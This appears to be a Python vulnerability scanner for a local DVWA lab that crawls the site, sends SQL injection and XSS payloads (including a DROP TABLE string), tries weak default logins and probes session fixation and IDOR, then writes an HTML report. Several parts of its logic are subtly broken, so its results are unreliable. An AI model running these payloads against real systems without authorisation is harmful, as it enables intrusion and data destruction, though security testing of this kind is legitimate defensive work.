import os
import re
import time
import json
import base64
import requests
import matplotlib.pyplot as plt
from io import BytesIO
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from jinja2 import Template

DEFAULT_HEADERS = {"User-Agent": "WebScanPro/1.0"}
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pdoexception",
    r"pg::syntaxerror",
    r"mysql server version",
    r"sqlite3::sqlexception",
    r"sqlstate"
]
XSS_REFLECT_PATTERNS = [
    r"<script>alert\(",
    r"onerror=",
    r"<svg",
    r"document\.cookie",
    r"innerHTML\s*=",
    r"eval\("
]

AUTHORIZATION_CONFIRMED = False
TARGET_BASE = "http://127.0.0.1:8081/dvwa"
LOGIN_PATH = "/login.php"
USERNAME = "admin"
PASSWORD = "password"
OUTPUT_DIR = "output"
REPORTS_DIR = "Reports"
CRAWL_FILE = os.path.join(OUTPUT_DIR, "crawler_output.json")
SQL_FILE = os.path.join(OUTPUT_DIR, "sql_findings.json")
XSS_FILE = os.path.join(OUTPUT_DIR, "xss_findings.json")
AUTH_FILE = os.path.join(OUTPUT_DIR, "auth_findings.json")
IDOR_FILE = os.path.join(OUTPUT_DIR, "idor_findings.json")
SUMMARY_FILE = os.path.join(OUTPUT_DIR, "summary.json")
REPORT_HTML = os.path.join(REPORTS_DIR, "vulnerability_report.html")

os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(REPORTS_DIR, exist_ok=True)

def get_session():
    s = requests.Session()
    s.headers.update(DEFAULT_HEADERS)
    return s

session = get_session()

def is_same_domain(base, url):
    try:
        return urlparse(base).netloc == urlparse(url).netloc
    except Exception:
        return False

def normalize_url(base, link):
    if not link:
        return None
    return urljoin(base, link)

def make_soup(html):
    try:
        return BeautifulSoup(html, "lxml")
    except Exception:
        return BeautifulSoup(html, "html.parser")

def extract_links(html, base_url):
    soup = make_soup(html)
    urls = set()
    for tag in soup.find_all(["a","link","area"], href=True):
        href = tag["href"].strip()
        u = normalize_url(base_url, href)
        if u:
            urls.add(u)
    for f in soup.find_all("form"):
        action = f.get("action") or base_url
        u = normalize_url(base_url, action)
        if u:
            urls.add(u)
    return urls

def extract_forms(html, base_url):
    soup = make_soup(html)
    forms = []
    for f in soup.find_all("form"):
        action = f.get("action") or base_url
        action = normalize_url(base_url, action)
        method = (f.get("method") or "GET").upper()
        inputs = []
        for inp in f.find_all(["input","textarea","select"]):
            name = inp.get("name")
            typ = (inp.get("type") or inp.name or "").lower()
            val = inp.get("value","")
            inputs.append({"name": name, "type": typ, "value": val})
        forms.append({"page": base_url, "action": action, "method": method, "inputs": inputs})
    return forms

def dvwa_login(username=USERNAME, password=PASSWORD):
    try:
        r = session.post(urljoin(TARGET_BASE, LOGIN_PATH), data={"username": username, "password": password, "Login": "Login"}, timeout=6)
        body = (r.text or "").lower()
        if any(x in body for x in ["logout", "security level", "dvwa"]) or r.status_code in (302,303):
            return True
        return True
    except Exception:
        return False

def crawl(start=TARGET_BASE, max_pages=200, delay=0.05):
    visited = set()
    pages = {}
    forms = []
    queue = [start]
    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited:
            continue
        try:
            r = session.get(url, timeout=6)
            html = r.text or ""
            links = list(extract_links(html, url))
            page_forms = extract_forms(html, url)
            pages[url] = {"status": r.status_code, "links": links, "forms": page_forms}
            forms.extend(page_forms)
            for L in links:
                if L.startswith(TARGET_BASE) and L not in visited and L not in queue:
                    queue.append(L)
            visited.add(url)
            time.sleep(delay)
        except Exception:
            visited.add(url)
            time.sleep(delay)
    result = {"pages": pages, "forms": forms}
    with open(CRAWL_FILE, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2)
    return result

SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "'; DROP TABLE users; --"]

def find_sql_errors(text):
    if not text:
        return False, None
    low = text.lower()
    for pat in SQL_ERROR_PATTERNS:
        if re.search(pat, low):
            return True, pat
    return False, None

def test_url_params_for_sqli(urls, timeout=6, delay=0.1):
    findings = []
    for url in urls:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue
            base = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
            for param in params:
                orig = params[param][0] if params[param] else ""
                for payload in SQL_PAYLOADS:
                    tp = dict(params)
                    tp[param] = orig + payload
                    q = urlencode(tp, doseq=True)
                    test_url = base + "?" + q
                    try:
                        r = session.get(test_url, timeout=timeout)
                        vuln, sig = find_sql_errors(r.text)
                        if vuln:
                            findings.append({"type": "SQLi", "url": test_url, "param": param, "payload": payload, "error": sig, "status": r.status_code})
                    except Exception:
                        pass
                    time.sleep(delay)
        except Exception:
            pass
    with open(SQL_FILE, "w", encoding="utf-8") as f:
        json.dump(findings, f, indent=2)
    return findings

XSS_PAYLOADS = ['"><script>alert(1)</script>', "<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>"]

def detect_reflected_xss(text):
    if not text:
        return False, None
    low = text.lower()
    for pat in XSS_REFLECT_PATTERNS:
        if re.search(pat, low):
            return True, pat
    return False, None

def test_xss_in_urls(urls, timeout=6, delay=0.1):
    findings = []
    for url in urls:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue
            base = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
            for param in params:
                for payload in XSS_PAYLOADS:
                    tp = dict(params)
                    tp[param] = payload
                    q = urlencode(tp, doseq=True)
                    test_url = base + "?" + q
                    try:
                        r = session.get(test_url, timeout=timeout)
                        found, sig = detect_reflected_xss(r.text)
                        if found or payload in (r.text or ""):
                            findings.append({"type": "XSS", "url": test_url, "param": param, "payload": payload, "status": r.status_code})
                    except Exception:
                        pass
                    time.sleep(delay)
        except Exception:
            pass
    with open(XSS_FILE, "w", encoding="utf-8") as f:
        json.dump(findings, f, indent=2)
    return findings

def test_xss_in_forms(forms, timeout=6, delay=0.1):
    findings = []
    for form in forms:
        action = form.get("action")
        method = form.get("method", "GET").upper()
        inputs = [i for i in form.get("inputs", []) if i.get("name")]
        if not inputs:
            continue
        for inp in inputs:
            for payload in XSS_PAYLOADS:
                data = {i["name"]: (payload if i["name"] == inp["name"] else (i.get("value") or "test")) for i in inputs}
                try:
                    if method == "POST":
                        r = session.post(action, data=data, timeout=timeout)
                    else:
                        r = session.get(action, params=data, timeout=timeout)
                    found, sig = detect_reflected_xss(r.text)
                    if found or payload in (r.text or ""):
                        findings.append({"type": "XSS", "action": action, "field": inp["name"], "payload": payload, "status": r.status_code})
                except Exception:
                    pass
                time.sleep(delay)
    existing = []
    try:
        with open(XSS_FILE, "r", encoding="utf-8") as f:
            existing = json.load(f)
    except Exception:
        existing = []
    existing.extend(findings)
    with open(XSS_FILE, "w", encoding="utf-8") as f:
        json.dump(existing, f, indent=2)
    return existing

WEAK_CREDS = [{"username": "admin", "password": "password"}, {"username": "admin", "password": "admin"}, {"username": "user", "password": "user"}]

def test_weak_credentials(login_path=LOGIN_PATH, attempts=WEAK_CREDS, timeout=6, delay=0.2):
    results = []
    for cred in attempts:
        try:
            s = requests.Session()
            r = s.post(urljoin(TARGET_BASE, login_path), data={"username": cred["username"], "password": cred["password"], "Login": "Login"}, timeout=timeout)
            body = (r.text or "").lower()
            success = any(x in body for x in ["logout", "welcome", "dashboard"]) or r.status_code in (302,303)
            results.append({"username": cred["username"], "password": cred["password"], "success": bool(success), "status": r.status_code})
        except Exception as e:
            results.append({"username": cred["username"], "password": cred["password"], "success": False, "error": str(e)})
        time.sleep(delay)
    with open(AUTH_FILE, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    return results

def test_session_fixation(acct, timeout=6):
    findings = []
    try:
        s_att = requests.Session()
        s_vic = requests.Session()
        domain = urlparse(TARGET_BASE).hostname
        fixed_val = "fixedsessiontest123"
        s_att.cookies.set("sessionid", fixed_val, domain=domain, path="/")
        s_vic.cookies.set("sessionid", fixed_val, domain=domain, path="/")
        s_vic.post(urljoin(TARGET_BASE, LOGIN_PATH), data={"username": acct["username"], "password": acct["password"], "Login": "Login"}, timeout=timeout)
        vic_cookies = {c.name: c.value for c in s_vic.cookies}
        for name, val in vic_cookies.items():
            if val == fixed_val:
                findings.append({"type": "session_fixation", "cookie": name, "detail": "cookie unchanged after login"})
                break
    except Exception:
        pass
    return findings

ID_PARAM_HINTS = re.compile(r"(?:^|_|\b)(id|user|order|invoice|file|doc|profile|acct|account)(?:$|\b)", re.I)

def is_uuid_like(s):
    return bool(re.match(r"^[0-9a-fA-F\-]{8,36}$", s))

def collect_candidate_from_url(u):
    candidates = []
    parsed = urlparse(u)
    qs = parse_qs(parsed.query)
    for p, vals in qs.items():
        if ID_PARAM_HINTS.search(p) or any(v.isdigit() or is_uuid_like(v) for v in vals):
            candidates.append({"type": "query", "url": u, "param": p, "value": vals[0] if vals else "", "method": "GET"})
    segs = [s for s in parsed.path.split("/") if s]
    for i, seg in enumerate(segs):
        if seg.isdigit() or is_uuid_like(seg):
            candidates.append({"type": "path", "url": u, "path_index": i, "value": seg, "method": "GET"})
    return candidates

def collect_candidate_from_form(f):
    cands = []
    action = f.get("action") or f.get("page")
    method = f.get("method", "GET").upper()
    for inp in f.get("inputs", []):
        name = inp.get("name")
        if not name:
            continue
    if ID_PARAM_HINTS.search(name) or (inp.get("type") and inp.get("type").lower() in ("hidden", "number")):
        cands.append({"type": "form", "url": action, "param": name, "method": method, "value": inp.get("value", "")})
    return cands

def discover_candidates(crawl):
    pages = crawl.get("pages", {})
    forms = crawl.get("forms", [])
    candidates = []
    for u in pages.keys():
        candidates.extend(collect_candidate_from_url(u))
    for f in forms:
        candidates.extend(collect_candidate_from_form(f))
    seen = set()
    unique = []
    for c in candidates:
        key = (c.get("url"), c.get("param", ""), c.get("type"), str(c.get("path_index", "")))
        if key in seen:
            continue
        seen.add(key)
        unique.append(c)
    return unique

def active_check_idor_query(c, acct_from, max_probes=5, delay=0.6):
    findings = []
    parsed = urlparse(c["url"])
    qs = parse_qs(parsed.query)
    original = qs.get(c["param"], [None])[0]
    if original is None:
        return findings
    repls = []
    if original.isdigit():
        v = int(original)
        for d in range(1, max_probes + 1):
            repls.append(str(v + d))
            if v - d > 0:
                repls.append(str(v - d))
    repls.extend([str(i) for i in range(1, min(5, max_probes + 1))])
    repls = list(dict.fromkeys(repls))[:max_probes]
    s = requests.Session()
    try:
        s.post(urljoin(TARGET_BASE, LOGIN_PATH), data={"username": acct_from["username"], "password": acct_from["password"], "Login": "Login"}, timeout=6)
    except Exception:
        pass
    for rpl in repls:
        try:
            qs2 = dict(qs)
            qs2[c["param"]] = rpl
            newq = urlencode(qs2, doseq=True)
            newurl = urlunparse(parsed._replace(query=newq))
            resp = s.get(newurl, timeout=6)
            findings.append({"type": "IDOR_probe", "as_user": acct_from["username"], "tested_value": rpl, "url": newurl, "status": resp.status_code, "length": len(resp.text or "")})
        except Exception:
            pass
        time.sleep(delay)
    return findings

def classify_for_report(item):
    t = (item.get("type") or "").lower() if isinstance(item, dict) else ""
    if "sqli" in t or "sql" in t or "id" in t or "idor" in t or "session" in t:
        return "High"
    if "xss" in t or "cookie" in t or "csrf" in t or "token" in t:
        return "Medium"
    return "Low"

def embed_bar_chart(data_counts):
    labels = list(data_counts.keys())
    values = [data_counts.get(k, 0) for k in labels]
    fig = plt.figure(figsize=(6,3))
    plt.bar(labels, values, color=["#b00020", "#d97706", "#107b10"])
    plt.title("Vulnerabilities by Severity")
    plt.tight_layout()
    buf = BytesIO()
    fig.savefig(buf, format="png")
    plt.close(fig)
    buf.seek(0)
    b64 = base64.b64encode(buf.read()).decode("utf-8")
    buf.close()
    return "data:image/png;base64," + b64

def generate_report(crawl_result, sql_find, xss_find, auth_find, idor_find):
    findings = []
    for i in sql_find:
        findings.append({"type": "SQLi", "endpoint": i.get("url") or i.get("endpoint", "N/A"), "severity": classify_for_report(i), "mitigation": "Use parameterized queries / prepared statements", "evidence": i.get("error") or ""})
    for i in xss_find:
        findings.append({"type": "XSS", "endpoint": i.get("url") or i.get("action") or "N/A", "severity": classify_for_report(i), "mitigation": "Sanitize and encode output, use CSP", "evidence": i.get("payload") or i.get("field") or ""})
    for i in auth_find:
        findings.append({"type": "Weak Credential", "endpoint": urljoin(TARGET_BASE, LOGIN_PATH), "severity": classify_for_report(i), "mitigation": "Enforce strong passwords and rate limiting", "evidence": str(i)})
    for i in idor_find:
        findings.append({"type": "IDOR", "endpoint": i.get("url") or i.get("tested_url", "N/A"), "severity": classify_for_report(i), "mitigation": "Enforce server-side ownership checks (RBAC/ABAC)", "evidence": i.get("tested_value") or ""})
    sev_counts = {"High": 0, "Medium": 0, "Low": 0}
    for f in findings:
        sev_counts[f["severity"]] = sev_counts.get(f["severity"], 0) + 1
    img_src = embed_bar_chart(sev_counts)
    tpl = Template("""<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Vulnerability Report</title>
<style>
body{font-family:Arial,Helvetica,sans-serif;margin:24px;color:#222}
h1{margin-bottom:6px}
.summary{margin-bottom:18px}
.table{border-collapse:collapse;width:100%;margin-top:18px}
.table th,.table td{border:1px solid #ddd;padding:8px;text-align:left}
.table th{background:#f4f4f4}
.sev-High{color:#b00020;font-weight:700}
.sev-Medium{color:#d97706;font-weight:700}
.sev-Low{color:#107b10;font-weight:700}
.small{font-size:0.9em;color:#555}
pre{white-space:pre-wrap;font-family:inherit}
</style>
</head>
<body>
<h1>Vulnerability Assessment Report</h1>
<div class="summary">
  <div style="display:flex;gap:20px;align-items:center">
    <div><img src="{{ img }}" alt="chart" width="420"></div>
    <div>
      <div class="small">Target: {{ target }}</div>
      <div class="small">Total findings: {{ total }}</div>
      <ul>
        <li class="sev-High">High: {{ counts['High'] }}</li>
        <li class="sev-Medium">Medium: {{ counts['Medium'] }}</li>
        <li class="sev-Low">Low: {{ counts['Low'] }}</li>
      </ul>
    </div>
  </div>
</div>
<table class="table">
<thead><tr><th>#</th><th>Vulnerability</th><th>Affected endpoint</th><th>Severity</th><th>Suggested mitigation</th><th>Evidence</th></tr></thead>
<tbody>
{% for f in findings %}
<tr>
<td>{{ loop.index }}</td>
<td>{{ f.type }}</td>
<td>{{ f.endpoint }}</td>
<td class="sev-{{ f.severity }}">{{ f.severity }}</td>
<td>{{ f.mitigation }}</td>
<td><pre>{{ f.evidence }}</pre></td>
</tr>
{% endfor %}
</tbody>
</table>
</body>
</html>""")
    html = tpl.render(findings=findings, counts=sev_counts, total=len(findings), img=img_src, target=TARGET_BASE)
    with open(REPORT_HTML, "w", encoding="utf-8") as f:
        f.write(html)
    with open(os.path.join(OUTPUT_DIR, "report_data.json"), "w", encoding="utf-8") as f:
        json.dump({"findings": findings, "counts": sev_counts}, f, indent=2)
    print("[+] HTML report created at", REPORT_HTML)

def run_all():
    dvwa_login()
    crawl_result = crawl()
    urls = list(crawl_result.get("pages", {}).keys())
    sql_find = test_url_params_for_sqli(urls)
    xss_find_urls = test_xss_in_urls(urls)
    xss_find_forms = test_xss_in_forms(crawl_result.get("forms", []))
    xss_find = xss_find_urls
    auth_find = test_weak_credentials()
    sf = test_session_fixation({"username": USERNAME, "password": PASSWORD})
    idor_candidates = discover_candidates(crawl_result)
    idor_findings = []
    if AUTHORIZATION_CONFIRMED:
        test_accounts = [{"username": USERNAME, "password": PASSWORD}]
        for i in range(len(test_accounts)):
            for j in range(len(test_accounts)):
                if i == j:
                    continue
                for c in idor_candidates:
                    if c["type"] == "query":
                        idor_findings.extend(active_check_idor_query(c, test_accounts[i]))
        if test_accounts:
            idor_findings.extend(test_session_fixation(test_accounts[0]))
    with open(SQL_FILE, "w", encoding="utf-8") as f:
        json.dump(sql_find, f, indent=2)
    with open(XSS_FILE, "w", encoding="utf-8") as f:
        json.dump(xss_find, f, indent=2)
    with open(AUTH_FILE, "w", encoding="utf-8") as f:
        json.dump(auth_find, f, indent=2)
    with open(IDOR_FILE, "w", encoding="utf-8") as f:
        json.dump(idor_findings, f, indent=2)
    summary = {"crawler": {"pages": len(crawl_result.get("pages", {})), "forms": len(crawl_result.get("forms", []))}, "sql": len(sql_find), "xss": len(xss_find), "auth": len(auth_find), "session_fixation": len(sf), "idor": len(idor_findings)}
    with open(SUMMARY_FILE, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2)
    generate_report(crawl_result, sql_find, xss_find, auth_find, idor_findings)
    print("Run complete. Summary:", summary)

if __name__ == "__main__":
    run_all()